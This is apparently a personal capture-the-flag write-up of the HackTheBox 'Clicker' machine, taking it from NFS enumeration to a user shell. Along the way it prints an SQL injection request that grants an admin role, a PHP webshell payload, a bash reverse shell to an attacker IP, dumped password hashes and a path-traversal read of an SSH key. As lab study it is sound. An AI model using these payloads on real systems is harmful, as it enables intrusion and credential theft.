@@ -1,0 +1,755 @@
+==
+tags: #enumeration #sqli
+
+==
+
+* nmap scan
+  #+begin_src bat
+  $ sudo nmap -A 10.10.11.232
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 08:17 EDT
+Nmap scan report for localhost (10.10.11.232)
+Host is up (0.046s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
+|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://clicker.htb/
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      33367/tcp   mountd
+|   100005  1,2,3      35141/udp   mountd
+|   100005  1,2,3      41016/udp6  mountd
+|   100005  1,2,3      44175/tcp6  mountd
+|   100021  1,3,4      33063/tcp   nlockmgr
+|   100021  1,3,4      42930/udp   nlockmgr
+|   100021  1,3,4      46169/tcp6  nlockmgr
+|   100021  1,3,4      48672/udp6  nlockmgr
+|   100024  1          35897/udp   status
+|   100024  1          49767/tcp   status
+|   100024  1          51641/udp6  status
+|   100024  1          59239/tcp6  status
+|   100227  3           2049/tcp   nfs_acl
+|_  100227  3           2049/tcp6  nfs_acl
+2049/tcp open  nfs_acl 3 (RPC #100227)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  #+end_src
+* httpd
+  we know there's an apache web server running on port 80, so i tried to access the default
+  site by visiting the ip; however, it does not return a valid page -- it gets automatically
+  redirected to =clicker.htb=, but we're met with the following error
+  #+begin_src
+  http://10.10.11.232 
+  #+end_src
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-14_17-10.png @ 2025-09-14 17:10:47
+  [[file:httpd/2025-09-14_17-10-47_2025-09-14_17-10.png]]
+  *add the ip in the hosts file*; now, on visiting =clicker.htb=, it shows:
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-15_10-19.png @ 2025-09-15 10:20:02
+  [[file:httpd/2025-09-15_10-20-02_2025-09-15_10-19.png]]
+* nfs
+  #+begin_src bat
+  $ showmount -e 10.10.11.232
+Export list for 10.10.11.232:
+/mnt/backups *
+                                                                                                                      
+  $ sudo mount -t nfs 10.10.11.232/mnt/backups /mnt
+mount.nfs: remote share not in 'host:dir' format
+
+  $ sudo mount -t nfs 10.10.11.232:/mnt/backups /mnt
+
+  $ ls /mnt
+clicker.htb_backup.zip
+
+  $ unzip /mnt/clicker.htb_backup.zip
+Archive:  /mnt/clicker.htb_backup.zip
+   creating: clicker.htb/
+  inflating: clicker.htb/play.php
+  inflating: clicker.htb/profile.php
+  inflating: clicker.htb/authenticate.php
+  inflating: clicker.htb/create_player.php
+  inflating: clicker.htb/logout.php
+  <SNIP>
+  #+end_src
+  =db_utils.php= is referenced in =authenticate.php= which looked interesting
+  #+begin_src bat
+  $ cat db_utils.php
+  <?php
+  session_start();
+
+  $db_server="localhost";
+  $db_username="clicker_db_user";
+  $db_password="clicker_db_password";
+  $db_name="clicker";
+  $mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);
+  $pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password);
+
+  <SNIP>
+  #+end_src
+  so there is a mysql instance running locally? scan all ports?
+  after taking a look at =authenticate.php= which uses /check_auth/ from =db_utils.php=:
+  #+begin_src bash
+  function check_auth($player, $password) {
+        global $pdo;
+        $params = ["player" => $player];
+        $stmt = $pdo->prepare("SELECT password FROM players WHERE username = :player");
+        $stmt->execute($params);
+        if ($stmt->rowCount() > 0) {
+                $row = $stmt->fetch(PDO::FETCH_ASSOC);
+                if(strcmp($row['password'], hash("sha256",$password)) == 0){
+                        return true;
+                }
+        }
+        return false;
+}
+  #+end_src
+  +this seems ripe for sql injection.+ couldn't get it to work; and actually, it's not,
+  according to copilot; it uses prepared statements.
+*** search for "password" in the directory
+    recursively run grep to search for strings containing "=password="
+    #+begin_src bat
+    $ grep -rEi *password* ./
+grep: warning: * at start of expression
+./db_utils.php:$db_password="clicker_db_password";
+./db_utils.php:$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);
+./db_utils.php:$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password);
+./db_utils.php:function create_new_player($player, $password) {
+./db_utils.php: $params = ["player"=>$player, "password"=>hash("sha256", $password)];
+./db_utils.php: $stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
+./db_utils.php:function check_auth($player, $password) {
+./db_utils.php: $stmt = $pdo->prepare("SELECT password FROM players WHERE username = :player");
+./db_utils.php:         if(strcmp($row['password'], hash("sha256",$password)) == 0){
+./create_player.php:if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] != "" && $_POST['password'] != "") {
+./create_player.php:            create_new_player($_POST['username'], $_POST['password']);
+./authenticate.php:if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] != "" && $_POST['password'] != "") {
+./authenticate.php:     if(check_auth($_POST['username'], $_POST['password'])) {
+./diagnostic.php:$db_password="clicker_db_password";
+./diagnostic.php:       $pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
+./login.php:    var password = document.forms["login_form"]["password"].value;
+./login.php:    if (username == "" || password == "") {
+./login.php:      alert("Username and Password can't be empty");
+./login.php:        <label for="inputPassword">Password</label>
+./login.php:        <input type="password" name='password' class="form-control" id="InputPassword" placeholder="Password">
+./register.php:    var password = document.forms["registration_form"]["password"].value;
+./register.php:    if (username == "" || password == "") {
+./register.php:      alert("Username and Password can't be empty");
+./register.php:        <label for="inputPassword">Password</label>
+./register.php:        <input type="password" name='password' class="form-control" id="InputPassword" placeholder="Password">
+    #+end_src
+    NOTE: the warning is saying we should be using =.*= instead; also, this simpler pattern
+    is enough for this case - =grep -ri password .=
+** db user
+   looking at the =db_utils= code again, it looks like mysql is running on the default port.
+   according to copilot, there would be a 5th argument for port otherwise
+   #+begin_src bash
+   $mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);
+   #+end_src
+   let's confirm
+   #+begin_src bat
+   $ sudo nmap -A 10.10.11.232 -p 3306
+
+PORT     STATE  SERVICE VERSION
+3306/tcp closed mysql
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT      ADDRESS
+1   46.21 ms localhost (10.10.16.1)
+2   76.15 ms clicker.htb (10.10.11.232)
+   #+end_src
+   closed? let's try connecting anyway
+   #+begin_src bat
+   $ mysql -u clicker_db_user -pclicker_db_password -h 10.10.11.232
+
+ERROR 2002 (HY000): Can't connect to server on '10.10.11.232' (115)
+   #+end_src
+   not sure what's going on - maybe firewall? let's try and see if we can register
+** register
+   yes, registering works with login =tester:testtest=
+** DOM injection
+   just playing around with the site; noticed after saving the game, we get a page with a
+   query parameter of the form =?msg=game has been saved=; so let's try to inject code
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-19_09-40.png @ 2025-09-19 09:40:17
+   [[file:nfs/2025-09-19_09-40-17_2025-09-19_09-40.png]]
+   here we go; it doesn't actually alert the msg but it's reflected on the DOM;
+   just to confirm, let's add html tags and see if's reflected:
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-19_09-42.png @ 2025-09-19 09:43:10
+   [[file:nfs/2025-09-19_09-43-10_2025-09-19_09-42.png]]
+   here are the corresponding lines in =index.php=
+   #+begin_src html
+   <h5 style="color:green;" name="msg"><?php echo $_GET['msg']; ?></h5>
+   <h5 style="color:red;" name="err"><?php echo $_GET['err']; ?></h5>
+   #+end_src
+** XSS
+   actually, this is vulnerable to *XSS* and not command injection (copilot);
+   also the XSS payload we should have used was =<script>alert('XSS')</script>=; and here we go:
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-19_10-22.png @ 2025-09-19 10:22:55
+   [[file:nfs/2025-09-19_10-22-55_2025-09-19_10-22.png]]
+   this is *reflected XSS*? *DOM-Based*? reflected, because it's processed server side(copilot)
+* guided mode
+  no useful progress, so let's switch to guided mode
+** How many four-digit or less open TCP ports are listening on Clicker  
+   i answered 4 from the earlier nmap run, but turns out that's not correct
+   #+begin_src bat
+   sudo nmap -p- -Pn 10.10.11.232
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+2049/tcp  open  nfs
+38303/tcp open  unknown
+39831/tcp open  unknown
+44499/tcp open  unknown
+47577/tcp open  unknown
+52647/tcp open  unknown
+   #+end_src
+   ok let's remove =-Pn=
+   #+begin_src bat
+   $ sudo nmap -p- 10.10.11.232 -T 5
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+2049/tcp  open  nfs
+38303/tcp open  unknown
+39831/tcp open  unknown
+44499/tcp open  unknown
+47577/tcp open  unknown
+52647/tcp open  unknown
+   #+end_src
+   ok still lists just 4; however, the answer is *5*?? even a less agressive scan reveals just 4
+** What is the full path that is shared over NFS
+   #+begin_src bat
+   /mnt/backups
+   #+end_src
+** Which PHP page is vulnerable to a mass assignment vulnerability
+   =db_utils= contains the following function:
+   #+begin_src bash
+   function save_profile($player, $args) {
+           global $pdo;
+           $params = ["player"=>$player];
+           $setStr = "";
+           foreach ($args as $key => $value) {
+                   $setStr .= $key . "=" . $pdo->quote($value) . ",";
+           }
+           $setStr = rtrim($setStr, ",");
+           $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
+           $stmt -> execute($params);
+   }
+   #+end_src
+   clearly, it looks like we should be able to update the player role here; let's confirm.
+   however, this function is called from the =save_game.php= file which accounts for this:
+   #+begin_src bash
+   <?php
+   session_start();
+   include_once("db_utils.php");
+   
+   if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
+           $args = [];
+           foreach($_GET as $key=>$value) {
+                   if (strtolower($key) === 'role') {
+                           // prevent malicious users to modify role
+                           header('Location: /index.php?err=Malicious activity detected!');
+                           die;
+                   }
+                   $args[$key] = $value;
+           }
+           save_profile($_SESSION['PLAYER'], $_GET);
+           // update session info
+           $_SESSION['CLICKS'] = $_GET['clicks'];
+           $_SESSION['LEVEL'] = $_GET['level'];
+           header('Location: /index.php?msg=Game has been saved!');
+   }
+   ?>
+   #+end_src
+   let's search for where else the save_profile function might be used:
+   #+begin_src bash
+   $ grep -r save_profile
+
+db_utils.php:function save_profile($player, $args) {
+save_game.php:  save_profile($_SESSION['PLAYER'], $_GET);
+   #+end_src
+   nothing new then; let's see where else an update query is used (filter for php files):
+   #+begin_src bash
+   grep -ri --include=*php update
+
+db_utils.php:   $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
+play.php:      update_level = <?php echo $_SESSION["LEVEL"]; ?>;
+play.php:      update_level = parseInt(update_level);
+play.php:      upgrade_cost = 15 * (5 ** update_level);
+play.php:        window.location.replace("/save_game.php?clicks="+money+"&level="+update_level);
+play.php:          update_level += 1;
+play.php:          document.getElementById("upgrade").innerHTML = addcomma(update_level) + " - LevelUP Cost: " + addco
+mma(upgrade_cost);
+play.php:        document.getElementById("click").innerHTML = "Level: " + addcomma(update_level);
+play.php:        document.getElementById("upgrade").innerHTML = addcomma(update_level) + " - LevelUP Cost: " + addcomm
+a(upgrade_cost);
+play.php:        document.getElementById("click").innerHTML = "Level: " + addcomma(update_level);
+save_game.php:  // update session info
+   #+end_src
+   let's do the same for insert statements:
+   #+begin_src bash
+   $ grep -ri --include=*php insert
+  
+db_utils.php:   $stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
+   #+end_src
+   let's focus on the =save_game.php= code:
+   #+begin_src bash
+   foreach($_GET as $key=>$value) {
+           if (strtolower($key) === 'role') {
+                   // prevent malicious users to modify role
+                   header('Location: /index.php?err=Malicious activity detected!');
+                   die;
+           }
+           $args[$key] = $value;
+   }
+   #+end_src
+   this kind of manual check is prone to some kind of failure; copilot suggested url-encoding
+   #+begin_src
+   ?%72%6f%6c%65=admin
+   #+end_src
+   but this didn't work
+   also tried adding spaces and other characters like =,= within the =role= string, so:
+   =ro le=; =ro,le=, etc. but that didn't work either; apparently mysql does not strip these
+   characters out of the column names in the query; and so the result is a 500 error.
+   NOTE: the hint makes it abundantly clear that it's this page; and the answer is accepted.
+*** HINT
+    looking at the hint for the next question, it suggests there's an SQLi Vuln in
+    =save_profile=
+    so let's look at it again
+       #+begin_src bash
+   function save_profile($player, $args) {
+           global $pdo;
+           $params = ["player"=>$player];
+           $setStr = "";
+           foreach ($args as $key => $value) {
+                   $setStr .= $key . "=" . $pdo->quote($value) . ",";
+           }
+           $setStr = rtrim($setStr, ",");
+           $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
+           $stmt -> execute($params);
+   }
+   #+end_src
+   we might be able to supply the value as a complete sql query?
+   #+begin_src bash
+   GET /save_game.php?clicks=32',+role='admin'
+   #+end_src
+   trying variations of this; but seems to just update the column with the whole string
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-21_13-52.png @ 2025-09-21 13:52:35
+   [[file:guided_mode/2025-09-21_13-52-35_2025-09-21_13-52.png]]
+   the key line is:
+   #+begin_src bash
+   $setStr .= $key . "=" . $pdo->quote($value) . ",";
+   #+end_src
+   so try something like this?
+   #+begin_src bash
+   $setStr -> clicks="32",role="admin"
+   #+end_src
+   all variations of this failed; gave up and had to take a look at the solution. the =$value=
+   cannot be exploited - because =$pdo= - instead it has to be the =$key=
+   so the =$key= has to be constructed like the following:
+   #+begin_src bash
+   $key = clicks=32,role='admin'
+   #+end_src
+   so, the URL should look like:
+   #+begin_src bash
+   GET /save_game.php?clicks=4,role='Admin'
+   #+end_src
+   however, this results in a *500 error*; because the query parameters can't be supplied in
+   this form; so:
+   #+begin_src bash
+   GET /save_game.php?clicks%3d4,role%3d'Admin',clicks=4
+   #+end_src
+   something like this will work; it interprets everthing before the === as the parameter key
+   and this gives us admin access. the new tab is called =Administration=
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-22_17-30.png @ 2025-09-22 17:30:30
+   [[file:guided_mode/2025-09-22_17-30-30_2025-09-22_17-30.png]]
+   it links to the =admin.php= page and its contents are below:
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-22_18-10.png @ 2025-09-22 18:10:14
+   [[file:guided_mode/2025-09-22_18-10-14_2025-09-22_18-10.png]]
+** pause
+   i'd like to take a break here from going through the guided mode and thinking about how we
+   could proceed from here.
+   clicking =Export= calls =export.php= and the below messsage is displayed on the portal
+   #+begin_src
+   Data has been saved in exports/top_players_cacdlynv.txt
+   #+end_src
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-22_18-13.png @ 2025-09-22 18:13:36
+   [[file:guided_mode/2025-09-22_18-13-36_2025-09-22_18-13.png]]
+   this looks like a directory we might be able to access -- but it's forbidden; however, the
+   text file path itself is accessible and we can see the same contents:
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-22_18-23.png @ 2025-09-22 18:24:12
+   [[file:guided_mode/2025-09-22_18-24-12_2025-09-22_18-23.png]]
+   we might try fuzzing for other files but the =cacdlynv= part seems to be randomly generated;
+   on generating a json, we get:
+   #+begin_src 
+   Data has been saved in exports/top_players_flwqg9xb.json
+   #+end_src
+   we can confirm the randomly generated part in =export.php=
+   #+begin_src bash
+   $filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
+   #+end_src
+   let's see what else admin can do
+   #+begin_src bash
+   $ grep -ri --include=*php admin
+
+export.php:if ($_SESSION["ROLE"] != "Admin") {
+export.php:header('Location: /admin.php?msg=Data has been saved in ' . $filename);
+db_utils.php:// ONLY FOR THE ADMIN
+index.php:          if ($_SESSION["ROLE"] == "Admin") {
+index.php:            echo '<a class="nav-link fw-bold py-1 px-0 active" href="/admin.php">Administration</a>';
+admin.php:if ($_SESSION["ROLE"] != "Admin") {
+admin.php:      <h3 class="float-md-start mb-0">Administration Portal</h3>
+   #+end_src
+*** idea - would it be possible to put in a reverse shell here
+    given that the =admin.php= page is generated based on the users with the most clicks:
+    #+begin_src sql
+$stmt = $pdo->query("SELECT nickname,clicks,level FROM players WHERE clicks >= " . $number); 
+    #+end_src
+    we should be able to manipulate the value in =Level= to be a reverse shell? i guess not?
+    #+begin_src bash
+GET /save_game.php?clicks%3d4,role%3d'Admin',clicks=999999&level='<?php system($_REQUEST['cmd']); ?>'
+    #+end_src
+    this is a working version of the intended payload; however, it doesn't work
+    #+begin_src bash
+GET /save_game.php?clicks%3d4,role%3d'Admin',clicks=99999999r99&nickname=<?php%20system($_REQUEST["cmd"]);%20?> HTTP/1.1
+    #+end_src
+    the content of the database is directly just put in an html table on the page; so this
+    does not work.
+    an interesting detail is there's a parameter you can pass to =export.php= POST request:
+    #+begin_src bash
+    $threshold = 1000000;
+    if (isset($_POST["threshold"]) && is_numeric($_POST["threshold"])) {
+        $threshold = $_POST["threshold"];
+    }
+    #+end_src
+    by default, it's set to that big value; however, on trying to send 0 as the threshold, it
+    did not result in any additional users being shown, but taking a look at the guided mode
+    again, the next question is:
+** what user is the web application running as
+   the hint is:
+   #+begin_src 
+   We can write a PHP webshell using the export page after editing our user's nickname.
+   #+end_src
+   FUCK. this is exactly what we were trying to do. gave up after considering that the
+   exported files were all simple static files.
+*** solution
+    ok, we did miss an important detail:
+    the =export.php= file checks for the extension and sees if it's =txt= or =json=; otherwise, it
+    goes to an =else= condition which assumes the extension is =html=. however, it's possible to
+    send =php= as the param and it will generate a php file instead:
+    #+begin_src bash
+    $filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
+    #+end_src
+    so, resending the request in firefox with the changes, we get:
+    #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-23_11-07.png @ 2025-09-23 11:07:57
+    [[file:guided_mode/2025-09-23_11-07-57_2025-09-23_11-07.png]]
+    and upon loading the page and issuing a command:
+    #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-23_11-08.png @ 2025-09-23 11:08:54
+    [[file:guided_mode/2025-09-23_11-08-54_2025-09-23_11-08.png]]
+    so the answer is =www-data=
+** pause again
+   let's try and get a reverse shell by issuing:
+   #+begin_src 
+   ?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.12/4444+0>%261'
+   #+end_src
+   et voila! we get a shell on the nc listener
+   #+begin_src bat
+   $ nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.16.12] from (UNKNOWN) [10.10.11.232] 49292
+bash: cannot set terminal process group (1204): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@clicker:/var/www/clicker.htb/exports$ 
+   #+end_src
+   this is a very basic shell, so let's try to upgrade
+   #+begin_src bash
+   python3 -c 'import pty;pty.spawn("/bin/bash")'
+   #+end_src
+   well, this does nothing and it looks like it's bash already so let's stick with this.
+*** upgrade shell (from the solution)
+    We can use the following chain of commands to get a proper TTY shell.
+    #+begin_src bash
+    script -c bash /dev/null
+    # CTRL + z
+    stty raw -echo; fg
+    # Enter twice
+    #+end_src
+*** mysql
+    #+begin_src bash
+    mysql -u clicker_db_user -pclicker_db_password
+    #+end_src
+    let's try and see if we can log into mysql; it's difficult to navigate, however, we are
+    eventually able to do a =select * from players;= on the =clicker= database and get the admin
+    password hash:
+#+begin_src 
+username        nickname        password        role    clicks  level
+admin   admin   ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82        Admin   999999999999999999  999999999
+
+ButtonLover99   ButtonLover99 55d1d58e17361fe78a61a96847b0e0226a0bc1a4e38a7b167c10b5cf513ca81f        User    10000000     100
+
+Paol    Paol    bff439c136463a07dac48e50b31a322a4538d1fac26bfb5fd3c48f57a17dabd3        User    2776354 75            
+
+tester  <?php system($_REQUEST["cmd"]); ?>      37268335dd6931045bdcdf92623ff819a64244b53d0e746d438797349d4da578    Admin    9999999999      0
+
+Th3Br0  Th3Br0  3185684ff9fd84f65a6c3037c3214ff4ebdd0e205b6acea97136d23407940c01        User    87947322        1     
+#+end_src
+    =ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82= is the admin hash
+    we know this is sha256 from the code
+    #+begin_src bash
+function create_new_player($player, $password) {
+    global $pdo;
+    $params = ["player"=>$player, "password"=>hash("sha256", $password)];
+    $stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
+    $stmt->execute($params);
+}
+    #+end_src
+*** try and crack the password
+    but before that, just checking the home directory, we see there's a user named =jack=.
+    this must be the user for the first flag; we can't access his home dir
+    #+begin_src bash
+    hashcat -m 1400 -a 0 ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82  /usr/share/wordlists/rockyou.txt
+    #+end_src
+    didn't work; giving up, back to guided mode
+** find the file owned by jack with the setuid and setgid permissions
+   #+begin_src bat
+   find / -user jack -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 /opt/manage/execute_query
+   #+end_src
+   let's look at what this does; well it turns out this is a custom binary.
+   going through the =strings=, we can see
+   #+begin_src 
+   create.sql
+   populate.sql
+   reset_password.sql
+   clean.sql
+   #+end_src
+   so like its name, it does have something to do with sql
+** Does the binary respond with the error message whenever an undocumented option is provided
+   ok since it says =undocumented=, it's maybe worth looking for local documentation. starting
+   with the directory where it's located.
+   #+begin_src 
+   www-data@clicker:/$ ls /opt/manage
+
+README.txt
+execute_query
+
+   www-data@clicker:/$ cat /opt/manage/README.txt
+
+Web application Management
+
+Use the binary to execute the following task:
+        - 1: Creates the database structure and adds user admin
+        - 2: Creates fake players (better not tell anyone)
+        - 3: Resets the admin password
+        - 4: Deletes all users except the admin
+
+   www-data@clicker:/$ /opt/manage/execute_query 3
+
+mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------
+UPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'
+--------------
+
+    www-data@clicker:/$ /opt/manage/execute_query 5
+
+bash: [6171: 2 (255)] tcsetattr: Inappropriate ioctl for device
+
+    www-data@clicker:/$ /opt/manage/execute_query 0
+
+ERROR: Invalid arguments
+   #+end_src
+   so yeah, apparently it doesn't. i had to look at the hint for this:
+   #+begin_src 
+   It does send an error message for 0, but does it for all?
+   #+end_src
+*** regarding the error
+    it looks like this particular error is shown because the tty was not upgraded at this
+    point; after doing so, it turns out that it's instead a *segmentation fault*:
+    #+begin_src bash
+    www-data@clicker:/opt/manage$ ./execute_query 5
+                                                                                              Segmentation fault (core dumped)
+    #+end_src
+** what is the full path to the 4 sql files that are stored for use in this binary
+   #+begin_src bash
+   find / -type f -name populate.sql 2>/dev/null
+   #+end_src
+   this returns nothing.
+   going over the binary again,
+   #+begin_src sql
+   www-data@clicker:/$ /opt/manage/execute_query 2
+
+mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------
+INSERT INTO players (username, nickname, password, role, clicks, level) 
+        VALUES ('ButtonLover99', 'ButtonLover99', sha2('BestGameinHistory',256), 'User', 10000000, 100)
+        ON DUPLICATE KEY UPDATE username=username
+--------------
+
+--------------
+INSERT INTO players (username, nickname, password, role, clicks, level) 
+        VALUES ('Paol', 'Paol', sha2('Yeah_What_a_Nickname',256), 'User', 2776354, 75)
+        ON DUPLICATE KEY UPDATE username=username
+--------------
+
+--------------
+INSERT INTO players (username, nickname, password, role, clicks, level)
+        VALUES ('Th3Br0', 'Th3Br0', sha2('Brohhhhhhhhhh',256), 'User', 87947322, 1)
+        ON DUPLICATE KEY UPDATE username=username
+--------------
+   #+end_src
+   let's do a wildcard search for sql files
+   #+begin_src bat
+   www-data@clicker:/opt/manage$ find / -type f -iname *sql 2>/dev/null
+
+/usr/share/lintian/overrides/php8.1-mysql
+/usr/share/mysql/innodb_memcached_config.sql
+/usr/share/mysql/debian_create_root_user.sql
+/usr/share/mysql/install_rewriter.sql
+/usr/share/mysql/uninstall_rewriter.sql
+/usr/share/bash-completion/completions/mysql
+/usr/share/bash-completion/completions/isql
+/usr/share/bash-completion/completions/psql
+/usr/bin/mysql_tzinfo_to_sql
+/usr/bin/mysql
+/var/lib/php/modules/8.1/apache2/enabled_by_maint/pdo_mysql
+/var/lib/php/modules/8.1/cli/enabled_by_maint/pdo_mysql
+/var/lib/php/modules/8.1/registry/pdo_mysql
+/etc/init.d/mysql
+/etc/apparmor.d/abstractions/mysql
+   #+end_src
+   +interesting+ ?? not so, it's just in a directory that we cannot access as this user.
+*** gdb
+    transfer the file to kali by setting up a python server on the target (exiting from which
+    kicks us out of the shell as well) and then examine the file in gdb; after a bit of
+    debugging, we get to a point where the sql files' directory is loaded - =/home/jack/queries=
+    #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-09-24_08-35.png @ 2025-09-24 08:35:44
+    [[file:guided_mode/2025-09-24_08-35-44_2025-09-24_08-35.png]]
+    the whole path was not visible via =strings=; it showed just =/home/jack/queri=; because i
+    guess the last part is added as a hex constant directly to memory via code
+*** ok, but now what
+    how do we proceed? how does this SUID binary help us gain access to jack's home dir?
+    it's at this point that I [[*regarding the error][discovered]] that the error which happens on supplying an invalid
+    but also non-zero input is a segmentation fault. maybe we can use this fact to do what we
+    need?
+*** SOLUTION
+    ok what they do is perform a path traversal attack by suppyling an invalid option and then
+    the path to a file as the second argument -- presumably derivable from looking at it in
+    a disassembler that it's possible to supply a second argument. anyway, they supply jack's
+    id_rsa filename here (=../../id_rsa=) and it prints it out.
+    NOTE: copying the private key resulted in an error; [[https://www.samltool.com/format_privatekey.php][samltool]] didn't fix it either
+    it's supposed to have 5 dashes on either side of its header and footer; validate with file
+    command
+    #+begin_src bash
+    $ file id_rsa.jack
+
+id_rsa.jack: OpenSSH private key 
+    #+end_src
+    after ssh ing, =cat user.txt= reveals fdd359a675868593461858c33232a462 is the flag
+** What is the full path to the file that jack can run as root using sudo
+   let's search again for suid binaries
+   #+begin_src bat
+   jack@clicker:~$ find / -perm -u=s -type f 2>/dev/null
+
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/fusermount3
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/mount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/libexec/polkit-agent-helper-1
+/usr/sbin/mount.nfs
+/opt/manage/execute_query
+   #+end_src
+   ok, maybe this is not the thing to do?
+   #+begin_src bat
+   jack@clicker:~$ sudo -l
+
+Matching Defaults entries for jack on clicker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jack may run the following commands on clicker:
+    (ALL : ALL) ALL
+    (root) SETENV: NOPASSWD: /opt/monitor.sh
+   #+end_src
+   let's run the binary with =sudo /opt/monitor.sh=
+   #+begin_src xml
+<?xml version="1.0"?>
+<data>
+ <timestamp>1758797138</timestamp>
+ <date>2025/09/2510:45:38am</date>
+ <php-version>8.1.2-1ubuntu2.14</php-version>
+ <test-connection-db>OK</test-connection-db>
+ <memory-usage>395616</memory-usage>
+ <environment>
+    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
+    <SYSTEMD_EXEC_PID>1166</SYSTEMD_EXEC_PID>
+    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
+    <JOURNAL_STREAM>8:25190</JOURNAL_STREAM>
+    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
+    <INVOCATION_ID>db0e51a6cfdd4535b9a16538b39c85ed</INVOCATION_ID>
+    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
+    <LANG>C</LANG>                                         
+    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
+    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
+    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
+    <PWD>/</PWD>
+  </environment>
+</data>
+   #+end_src
+** What is the environment variable that will configure how applications proxy HTTP traffic
+   ok, this doesn't look like anything we could get from the above output
+*** HINT - Search for terms like "http proxy linux environment variable"
+    oh, they just want the name of the env var; it's =http_proxy=
+*** chatgpt explanation of http_proxy
+    Setting =HTTP_PROXY= means: "For all outgoing HTTP requests, instead of connecting directly,
+    send the traffic to this proxy server and let it forward it for me."
+** What Perl-related env var allows the user to set Perl code run when run with debug mode
+   the hint is - it's the same used in [[file:d:/code/htb/academy/modules/attacking-common-services/lab2.org::*official solution][this exploit]]; and the answer is =PERL5DB=   
+** read root flag
